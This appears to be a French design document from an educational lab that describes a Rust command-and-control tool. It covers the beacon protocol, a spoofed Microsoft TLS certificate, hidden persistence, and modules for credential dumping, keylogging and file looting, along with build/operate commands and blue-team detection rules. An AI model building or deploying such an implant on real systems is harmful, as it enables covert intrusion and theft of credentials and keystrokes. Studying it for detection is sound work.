# VIR-25 — Design Architecture C2

**Auteur :** Deniz Ok
**Date :** 2026-09-17
**MITRE :** T1071 — Application Layer Protocol / T1573.002 — Encrypted Channel: Asymmetric Cryptography

---

## Ce que ça fait

Ce document décrit l'architecture complète de **s0P0wn3d**, un outil C2 (Command & Control)
pédagogique composé de deux parties qui communiquent via HTTPS.

---

## Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────────────┐
│  HOST — Machine Deniz (192.168.56.112)                              │
│                                                                     │
│  ┌──────────────────────────────────┐                               │
│  │  c2_server/src/main.rs           │  axum + TLS (port 443)        │
│  │                                  │                               │
│  │  POST /beacon  ← check-in agent  │                               │
│  │  POST /result  ← résultats       │                               │
│  │  POST /task    → ordres operator │                               │
│  │  GET  /agents  → liste agents    │                               │
│  └──────────────┬───────────────────┘                               │
│                 │  HTTPS (TLS 1.2+, rustls, cert auto-signé         │
│                 │  CN=update.microsoft.com)                         │
└─────────────────┼───────────────────────────────────────────────────┘
                  │  host-only network 192.168.56.0/24
                  │  (jamais exposé sur le réseau réel)
┌─────────────────┼───────────────────────────────────────────────────┐
│  VM CIBLE — Windows 11 Enterprise (192.168.56.111)                  │
│             │                                                       │
│  ┌──────────▼───────────────────────┐                               │
│  │  implant/src/communication/      │  boucle beacon toutes 5s      │
│  │  https.rs                        │  + jitter ±2s (anti-détection)│
│  │                                  │                               │
│  │  1. POST /beacon → reçoit tasks  │                               │
│  │  2. dispatch vers execution/     │                               │
│  │  3. POST /result → envoie output │                               │
│  └──────────────────────────────────┘                               │
│                                                                     │
│  Emplacement physique sur la VM :                                   │
│  C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Display\         │
│    <implant>.exe  ← beacon (masquerade T1036.005)                   │
│                                                                     │
│  Registry : HKCU\...\Run → valeur "DisplayOptimization"             │
│  Scheduled Task : "DisplayOptimizationTask"                         │
│  Trigger : logon (tout utilisateur) — Hidden: Yes                   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Flux de communication détaillé

### 1. Check-in (toutes les 5 secondes ± jitter)

```
Agent → Serveur
POST /beacon
Content-Type: application/json
{"agent_id": "agent_mac_id"}

Serveur → Agent
{"tasks": [{"id": "t1", "cmd": "shell", "args": ["whoami"]}]}
```

Si aucune tâche en attente, le serveur répond `{"tasks": []}` et l'agent se rendort.

### 2. Exécution + résultat

```
Agent → Serveur
POST /result
{"agent_id": "agent_mac_id", "task_id": "t1", "output": "NT AUTHORITY\\SYSTEM"}
```

### 3. L'opérateur envoie un ordre

```
Opérateur → Serveur (depuis le host)
POST /task
{"id": "agent_mac_id", "task": {"id": "t2", "cmd": "shell", "args": ["ipconfig /all"]}}
```

---

## Composants et fichiers

```
s0P0wn3d/
│
├── shared/                     ← crate partagée (host + implant)
│   └── src/
│       ├── lib.rs              ← re-exports pub mod crypto; pub mod protocol;
│       ├── crypto.rs           ← AES-256-GCM + RSA-4096 (VIR-31)
│       └── protocol.rs         ← structs JSON : CheckIn, Task, TaskResult… (VIR-31)
│
├── c2_server/                  ← tourne sur le HOST (axum)
│   └── src/
│       ├── main.rs             ← démarre axum sur 0.0.0.0:443
│       ├── routes.rs           ← /beacon /result /task /agents
│       ├── state.rs            ← sessions agents, queue de tâches (AppState)
│       └── handler.rs          ← logique checkin / store_result / queue_task
│
├── implant/                    ← tourne sur la VM CIBLE (Windows x86_64-msvc)
│   └── src/
│       ├── main.rs             ← boucle beacon + dispatch des commandes
│       ├── config.rs           ← IP C2, port, intervalle (obfstr à la compilation)
│       │
│       ├── communication/      ← transport réseau (VIR-30)
│       │   ├── mod.rs
│       │   ├── https.rs        ← beacon HTTPS polling reqwest + rustls + jitter
│       │   └── dns.rs          ← tunnel DNS alternatif (T1071.004)
│       │
│       ├── evasion/            ← furtivité AV (VIR-28)
│       │   ├── mod.rs
│       │   ├── api_hashing.rs  ← résolution dynamique WinAPI via hash (évite IAT)
│       │   └── obfuscation.rs  ← obfstr! — strings chiffrées à la compilation
│       │
│       ├── persistence/        ← survie au reboot (VIR-32)
│       │   ├── mod.rs
│       │   ├── registry.rs         ← HKCU...\Run → valeur "DisplayOptimization"
│       │   ├── scheduled_task.rs   ← tâche planifiée "DisplayOptimizationTask" (T1053.005)
│       │   └── watchdog.rs         ← RegisterWaitForSingleObject — relance si tué
│       │
│       └── execution/          ← capacités offensives
│           ├── mod.rs
│           ├── shell.rs        ← cmd/powershell via pipes anonymes (VIR-29, T1059)
│           ├── creds.rs        ← extraction credentials SAM/LSASS (VIR-33, T1003)
│           ├── keylog.rs       ← capture clavier SetWindowsHookEx (VIR-35, T1056.001)
│           └── loot.rs         ← collecte fichiers sensibles (VIR-38, T1005)
│
├── scripts/gen_cert.py         ← génère cert.pem + key.pem (one-shot)
└── certs/                      ← cert.pem + key.pem (dans .gitignore)
```

---

## Choix techniques justifiés

| Décision | Raison |
|---|---|
| HTTPS port 443 | Trafic indiscernable d'une mise à jour Windows légitime |
| Pull (beacon poll) | Pas de connexion entrante sur la VM — bypasse les firewalls |
| Jitter ±2s | Évite les patterns de trafic régulier détectables par un SIEM |
| Cert CN=update.microsoft.com | Légitime aux yeux d'un analyste qui survole les logs TLS |
| Masquerade `%APPDATA%\Microsoft\Windows\Display\` | Dossier Microsoft légitime toujours présent, indépendant d'OneDrive |
| Rust + MSVC toolchain | Binaire natif Windows, pas de dépendance Python/DLL externe, meilleure évasion AV |
| RSA-4096 + AES-256-GCM | Échange de clé asymétrique initial, puis chiffrement symétrique de session |
| rustls (pas OpenSSL) | TLS natif Rust, zéro dépendance système, CRT statique |

---

## Inspirations architecturales

Ce design s'inspire de trois outils open-source de référence, **uniquement sur le plan architectural** — aucun code n'est réutilisé.

| Outil | Ce qu'on en retient |
|---|---|
| **Metasploit** | Séparation claire handler (serveur) / payload (implant), pattern de staging, queue de tâches par session |
| **Sliver** | Architecture Go/Rust avec workspace multi-crates, canal HTTPS avec certificat auto-signé, beacon poll + jitter, chiffrement de session asymétrique + symétrique |
| **Ligolo-ng** | Pattern de connexion reverse (agent initie la connexion vers le serveur, jamais l'inverse) |

### Différences volontaires avec ces frameworks

- **Pas de staging** — l'implant est un binaire autonome (simplifie l'architecture pour un lab pédagogique)
- **Pas de listener générique** — un seul canal HTTPS (pas de SMB/TCP raw/DNS en parallèle)
- **Low-level windows-rs** uniquement — pas de dépendance à des librairies all-in-one

---

## Compilation

```bash
# Depuis le workspace root
cargo check --workspace

# Build de l'implant (binaire Windows)
cargo build -p implant --target x86_64-pc-windows-msvc --release
# → target/x86_64-pc-windows-msvc/release/implant.exe

# Build du serveur C2
cargo build -p c2_server --release
```

---

## Mapping MITRE ATT&CK

| Technique | ID | Composant concerné |
|---|---|---|
| Application Layer Protocol: Web Protocols | T1071.001 | Canal HTTPS beacon ↔ serveur |
| Encrypted Channel: Asymmetric Cryptography | T1573.002 | RSA-4096 + AES-256-GCM sur toutes les comms |
| Masquerading: Match Legitimate Name | T1036.005 | implant déployé dans `%APPDATA%\Microsoft\Windows\Display\` |
| Scheduled Task/Job: Scheduled Task | T1053.005 | tâche `DisplayOptimizationTask` au logon |
| Command and Scripting Interpreter | T1059 | execution/shell.rs via CreateProcess + pipes |
| OS Credential Dumping | T1003 | execution/creds.rs — SAM/LSASS |
| Input Capture: Keylogging | T1056.001 | execution/keylog.rs — SetWindowsHookEx |
| Data from Local System | T1005 | execution/loot.rs — collecte fichiers |

---

## Blue team — détection

| Indicateur | Outil de détection |
|---|---|
| Connexions HTTPS sortantes régulières vers 192.168.56.112 toutes les ~5s | Wireshark / Zeek — filtre `ip.dst == 192.168.56.112 && tls` |
| Certificat TLS auto-signé avec CN=update.microsoft.com (issuer = subject) | Wireshark — `tls.handshake.certificate` → vérifier l'issuer |
| Processus dans `%APPDATA%\Microsoft\Windows\Display\` avec parent inhabituel | Windows Event 4688 — surveiller le PPID et le chemin process |
| Scheduled Task nommée "DisplayOptimizationTask" créée par un utilisateur | Event 4698 — création de scheduled task |
| Valeur registre `DisplayOptimization` dans `HKCU\...\Run` | Sysmon Event 13 — Registry value set |
| `reg save HKLM\SAM` dans les logs de commandes | Event 4688 + Sysmon Event 1 |

**Sigma rule (détection scheduled task suspecte) :**
```yaml
title: Scheduled Task DisplayOptimization Masquerade
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
    TaskName|contains: 'DisplayOptimization'
  condition: selection
level: high
```

---

## Comment tester (lab uniquement)

```bash
# 1. Générer les certificats
python scripts/gen_cert.py

# 2. Démarrer le serveur C2 sur le host
cargo run -p c2_server

# 3. Compiler et déployer l'implant sur la VM
cargo build -p implant --target x86_64-pc-windows-msvc --release
# Copier target/x86_64-pc-windows-msvc/release/implant.exe
# → C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Display\implant.exe
# (le module persistence le copie automatiquement au premier lancement)

# 4. Vérifier le check-in depuis le host
curl -k https://192.168.56.112/agents

# 5. Envoyer une commande
curl -k -X POST https://192.168.56.112/task \
  -H "Content-Type: application/json" \
  -d '{"id": "<agent_id>", "task": {"id": "t1", "cmd": "shell", "args": ["whoami"]}}'
```
